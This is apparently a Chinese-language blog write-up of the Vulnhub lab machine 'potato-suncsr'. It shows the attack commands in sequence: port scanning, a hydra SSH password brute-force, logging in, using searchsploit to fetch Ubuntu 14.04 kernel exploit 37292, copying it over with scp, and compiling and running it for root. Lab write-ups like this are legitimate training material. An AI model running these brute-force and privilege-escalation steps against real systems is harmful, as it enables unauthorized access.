---
layout: post
title: potato-suncsr
subtitle: potato-suncsr
date: 2023-07-12 10:24
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
  - Vulnhub
number headings: first-level 2, max 4, 1.1., auto
published: true
---

## 1. 信息搜集

扫描发现主机 `192.168.163.133`

![image.png](https://img.ghostliner.top/NvGNLM.png)

扫描端口

![image.png](https://img.ghostliner.top/SUmsGq.png)

访问 80 端口，未发现有效信息，目录扫描发现 `/info.php`

`whatweb` 未发现信息

## 2. SSH 爆破

```shell
hydra -l potato -P 字典2/字典.txt -vV ssh://192.168.163.133:7120
```

![image.png](https://img.ghostliner.top/Q688l8.png)

```shell
ssh -p 7120 potato@192.168.163.133
```

## 3. 提权

进入目标机后，尝试 sudo, find 提权失败，查看系统信息

```shell
cat /etc/issue
uname -a
```

![image.png](https://img.ghostliner.top/N5KzN9.png)

搜索相关漏洞

```shell
searchsploit ubuntu 14.04
```

![image.png](https://img.ghostliner.top/7OioDi.png)

```shell
# 复制文件
searchsploit -m 37292
# 传输到目标机
scp -P 7120 37292.c potato@192.168.163.133:~
```

在目标机上编译并执行

```shell
gcc 37292.c
./a.out
```

![image.png](https://img.ghostliner.top/BNYY9H.png)

找到 flag
![image.png](https://img.ghostliner.top/vmiV9f.png)
